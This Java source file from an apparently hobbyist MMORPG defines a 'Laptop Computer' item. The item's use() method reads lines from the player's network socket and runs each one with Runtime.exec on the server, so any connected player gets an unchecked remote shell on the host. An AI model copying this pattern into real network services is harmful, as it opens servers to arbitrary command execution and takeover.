/**
 * Copyright (c) 2012 Sean Beecroft, Permission is hereby granted, free of
 * charge, to any person obtaining a copy of this software and associated
 * documentation files (the "Software"), to deal in the Software without
 * restriction, including without limitation the rights to use, copy, modify,
 * merge, publish, distribute, sublicense, and/or sell copies of the Software,
 * and to permit persons to whom the Software is furnished to do so, subject to
 * the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 *
 */
package mmorpg.model.items;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;
import mmorpg.model.items.properties.Immovable;
import mmorpg.model.items.properties.InfinitelyUsable;
import mmorpg.model.living.Living;

/**
 *
 * @author beecrofs
 */
public class Computer extends Item implements InfinitelyUsable {

    public Computer() {
        setName("Laptop Computer");
        setDescription("This is a state of the art computer");
        addHandle("Laptop Computer");
        addHandle("Laptop");
    }

    @Override
    public void use(Living entity) {
        try {
            Scanner scanner = new Scanner(entity.getSocket().getInputStream());
            entity.getLog().println("Mindy Laptop Starting (type exit to quit)...");
            boolean f = true;
            while (f) {
                entity.getLog().println("$>");
                String line = scanner.nextLine();
                if (line.equalsIgnoreCase("exit")) {
                    break;
                }
                Process p = Runtime.getRuntime().exec(line);
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String buf = null;
                while ((buf = reader.readLine()) != null) {
                    entity.getLog().println(buf);
                }

            }
        } catch (IOException ex) {
            entity.getLog().println("" + ex.getMessage());
        }

    }
}
